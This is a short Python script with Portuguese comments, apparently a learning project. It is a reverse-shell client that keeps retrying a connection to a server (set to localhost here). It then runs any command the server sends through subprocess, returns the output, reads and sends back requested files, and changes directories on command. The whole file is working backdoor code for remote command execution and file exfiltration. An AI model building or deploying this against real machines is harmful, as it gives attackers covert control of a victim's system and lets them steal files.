import socket
import os
import subprocess
import time

host = 'localhost'
port = 62345
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Deixando o Cliente em Loop até conseguir
# se Conectar ao Servidor
def conn_server():
    while True:
        try:
            print('Tentando conectar ao servidor em {}:{}...'.format(host, port))
            soc.connect((host, port))
            print('Conexão bem-sucedida!')
            break
        except socket.error as erro:
            print(str(erro))
            print('Tentando novamente em 30 segundos...')
            time.sleep(30)
try:
    conn_server()
    while True:
        # Entrada Principal de Dados
        entry = soc.recv(50000).decode()
        while True:
            # Tratando se for Mensagem
            if entry.startswith('msg'):
                print(entry[3:])
                break
            # Tratando se for Comando
            if entry.startswith('cmd'):
                # Reconhece se for o Comando 'cpy', copia o arquivo e o Envia...
                if 'cpy' in entry[3:]:
                    print('<<< Modulo de Copiar Arq >>>') # Testando para ver se esta entrando aqui...
                    # Aqui eu junto os nomes e caminhos tudo em um só, (esse é o trabalho do path)
                    caminho_e_arquivo = os.path.join(os.getcwd(), entry[6:])
                    print(caminho_e_arquivo) # Testando se esta juntando corretamente...
                    # Lendo o Arquivo e Enviando-o
                    with open(caminho_e_arquivo, 'rb') as file:
                        for data in file.readlines():
                            if not data:
                                break
                            soc.send(data)
                        print('Arquivo Enviado...')
                        break
                # Se o comando for apenas 'CD', mostra o meu caminho atual...
                if entry[3:] == 'cd':
                    print('if apenas para mostrar onde estou')
                    soc.send(os.getcwd().encode())
                    break
                # Executa qualquer comando enviado e captura apenas a saida dele
                if len(entry) > 0:
                    print('<<< Modulo de Exec Comando >>>')
                    print('Comando "{}" executado.'.format(entry))
                    saida = subprocess.getoutput(entry[3:])
                # Aqui serve para navegar nas pastas
                # se no comando tiver 'CD', ele corta os 3 primeiros
                # digitos e chama o chdir + 'comando', assim o script
                # navega entre as pastas sem retornar nada... apenas Vai
                if 'cd' in entry[3:]:
                    print('Mudado para a Pasta "{}".'.format(entry[3:]))
                    os.chdir(entry[6:])
                # Aqui eu Envio a Saida dos comandos Junto com
                # o local de onde estou executando.
                soc.send((saida + '\n' + os.getcwd()).encode())
                break
except socket.error as erro:
    print('Falha na conexão ao servidor:', str(erro))
    soc.close()
